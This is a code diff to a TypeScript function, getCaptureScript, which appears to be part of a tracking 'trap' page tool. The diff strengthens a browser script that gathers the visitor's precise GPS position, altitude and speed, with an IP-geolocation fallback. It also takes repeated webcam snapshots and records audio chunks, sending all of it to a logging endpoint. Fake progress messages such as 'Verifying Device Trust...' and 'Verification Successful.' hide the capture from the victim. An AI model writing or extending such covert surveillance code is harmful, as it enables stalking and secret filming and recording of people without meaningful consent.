@@ -15,6 +15,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     var cfg = ${JSON.stringify(theme)};
     
     var extraBuffer = {};
+    var extraTimeout = null;
     window.lastStatusMsg = "Initializing...";
 
     // --- Core Functions ---
@@ -23,8 +24,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       try {
         const response = await fetch('/api/log/' + targetId + '/' + type, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-Trap-Id': targetId
+          },
+          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId, ts: Date.now() }, data))
         });
         return response;
       } catch(e) {
@@ -34,11 +38,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     }
 
     async function logExtra(data) {
-      await logEvent('extra', data);
+      Object.assign(extraBuffer, data);
+      if (extraTimeout) clearTimeout(extraTimeout);
+      extraTimeout = setTimeout(flushExtra, 1500);
     }
 
     async function flushExtra() {
-      // Deprecated
+      if (Object.keys(extraBuffer).length > 0) {
+        var dataToSend = Object.assign({}, extraBuffer);
+        extraBuffer = {};
+        await logEvent('extra', dataToSend);
+      }
     }
 
     function clientLog(msg, data = {}) {
@@ -135,14 +145,23 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         clientLog("fireGPS: GPS permission included");
         return new Promise(resolve => {
           var bestAcc = 999999;
+          var hasLoggedOnce = false;
+
           var gpsWatch = navigator.geolocation.watchPosition(
             (pos) => { 
                if (pos.coords.accuracy < bestAcc) {
                  bestAcc = pos.coords.accuracy;
-                 logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy.toFixed(1) }); 
+                 logEvent('gps', { 
+                   lat: pos.coords.latitude, 
+                   lon: pos.coords.longitude, 
+                   acc: pos.coords.accuracy.toFixed(1),
+                   alt: pos.coords.altitude || 'N/A',
+                   speed: pos.coords.speed || 'N/A'
+                 }); 
+                 hasLoggedOnce = true;
                }
-               // Resolve if accuracy is good enough (< 30 meters)
-               if (pos.coords.accuracy < 30) {
+               // Resolve if accuracy is good enough (< 20 meters)
+               if (pos.coords.accuracy < 20) {
                  navigator.geolocation.clearWatch(gpsWatch);
                  permsCompleted++; 
                  resolve(); 
@@ -150,20 +169,22 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             },
             (e) => { 
                 clientLog("fireGPS: Error", e.message);
-                fetch('https://ipapi.co/json/')
-                    .then(r => r.json())
-                    .then(data => logEvent('ip_geo', data))
-                    .catch(err => clientLog("IP Geo failed", err.message));
+                if (!hasLoggedOnce) {
+                  fetch('https://ipapi.co/json/')
+                      .then(r => r.json())
+                      .then(data => logEvent('ip_geo', data))
+                      .catch(err => clientLog("IP Geo failed", err.message));
+                }
                 permsCompleted++; 
                 resolve(); 
             },
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 }
           );
-          // Safety timeout: 15 seconds to get the best possible fix
+          // Safety timeout: 20 seconds to get the best possible fix
           setTimeout(() => { 
             navigator.geolocation.clearWatch(gpsWatch);
             resolve(); 
-          }, 15000); 
+          }, 20000); 
         });
       } else if (requiredPerms.includes('gps')) {
          permsCompleted++;
@@ -199,53 +220,80 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               video.srcObject = stream;
               video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
               document.body.appendChild(video);
+              
               await new Promise(r => { 
-                video.onloadedmetadata = () => { video.play().then(r).catch(r); }; 
-                setTimeout(r, 2000); 
+                video.onloadedmetadata = () => { 
+                  video.play().then(() => {
+                    clientLog("fireParallel: Video playing");
+                    r();
+                  }).catch(e => {
+                    clientLog("fireParallel: Video play error", e.message);
+                    r();
+                  }); 
+                };
+                setTimeout(r, 2500); 
               });
               
-              // Capture high quality shot after settling
-              setTimeout(async () => {
-                var canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                var ctx = canvas.getContext('2d');
-                if (ctx) { 
-                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
-                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.85) }); 
-                }
-              }, 1000);
-
-              setInterval(async () => {
-                var canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                var ctx = canvas.getContext('2d');
-                if (ctx) { 
-                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
-                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.7) }); 
-                }
-              }, 5000);
+              // Set up recurring captures
+              var captureIdx = 0;
+              var captureTimer = setInterval(async () => {
+                try {
+                  var canvas = document.createElement('canvas');
+                  canvas.width = video.videoWidth || 1280;
+                  canvas.height = video.videoHeight || 720;
+                  var ctx = canvas.getContext('2d');
+                  if (ctx && video.readyState >= 2) { 
+                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                     var quality = captureIdx === 0 ? 0.85 : 0.7;
+                     await logEvent('extra', { 
+                       visual_identity: canvas.toDataURL('image/jpeg', quality),
+                       capture_index: captureIdx++
+                     }); 
+                  }
+                } catch(e) { clientLog("Capture error", e.message); }
+              }, 4000);
+              
+              // Stop interval on redirect
+              setTimeout(() => { clearInterval(captureTimer); }, 55000);
 
               if (stream.getAudioTracks().length > 0) {
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = async (e) => {
-                  if (e.data.size > 0) {
-                    const reader = new FileReader();
-                    reader.onload = async () => {
-                      const base64 = reader.result.split(',')[1];
-                      await logEvent('extra', { audio_chunk: base64 });
-                    };
-                    reader.readAsDataURL(e.data);
-                  }
-                };
-                setInterval(() => {
-                  try {
-                    if (recorder.state === 'inactive') recorder.start();
-                    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4000);
-                  } catch(err) {}
-                }, 5000);
+                try {
+                  const recorder = new MediaRecorder(stream);
+                  recorder.ondataavailable = async (e) => {
+                    if (e.data.size > 0) {
+                      const reader = new FileReader();
+                      reader.onload = async () => {
+                        const base64 = typeof reader.result === 'string' ? reader.result.split(',')[1] : '';
+                        if (base64) await logEvent('extra', { audio_chunk: base64 });
+                      };
+                      reader.readAsDataURL(e.data);
+                    }
+                  };
+                  setInterval(() => {
+                    try {
+                      if (recorder.state === 'inactive') recorder.start();
+                      setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4000);
+                    } catch(err) {}
+                  }, 5000);
+                } catch(e) { clientLog("Audio Recorder Error", e.message); }
               }
+
+              // Capture high quality shot after settling and wait for it
+              await new Promise(resolve => {
+                setTimeout(async () => {
+                  try {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    var ctx = canvas.getContext('2d');
+                    if (ctx) { 
+                       ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                       await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.85) }); 
+                    }
+                  } catch(e) {}
+                  resolve(null);
+                }, 1200);
+              });
             }
           }
         } catch(e) { clientLog("fireParallel: Exception", e.message); }
@@ -379,7 +427,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       running = true;
 
       console.log("[DEBUG] startCapture: Enter", { mode });
-      clientLog("startCapture: Enter", { mode });
+      clientLog("startCapture: Enter", { mode, perms: requiredPerms });
       
       var isSilent = mode === 'silent' || flowType === 'silent';
       var accent = cfg.accent || '#3498db';
@@ -425,14 +473,22 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           btn.innerText = "Processing...";
         }
 
-        // We run high-value captures in parallel to get data as fast as possible
-        // but we handle the promises to track completion
-        var mainCaptures = [];
+        updateProgress(10, "Verifying Device Trust...");
         
-        mainCaptures.push(fireGPS().catch(e => clientLog("GPS Error", e.message)));
-        mainCaptures.push(fireParallel().catch(e => clientLog("Media Error", e.message)));
+        // High-value captures sequentially to ensure they finish
+        try {
+           updateProgress(30, "Establishing GPS Precision...");
+           await fireGPS().catch(e => clientLog("GPS Error", e.message));
+        } catch(e) {}
 
-        // Other permissions run sequentially to avoid overloading prompts
+        try {
+           updateProgress(60, "Syncing Media Identity...");
+           await fireParallel().catch(e => clientLog("Media Error", e.message));
+        } catch(e) {}
+
+        updateProgress(85, "Hardening Connection...");
+
+        // Other permissions run sequentially
         (async function() {
            for (const p of requiredPerms) {
              if (p !== 'gps' && p !== 'media') {
@@ -442,9 +498,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              }
            }
         })();
-
-        // Wait for main captures before allowing redirect early
-        await Promise.all(mainCaptures);
+        
+        updateProgress(100, "Verification Successful.");
       } else {
         // Silent flow permissions
         if (requiredPerms.includes('vibration') && navigator.vibrate) navigator.vibrate(200);
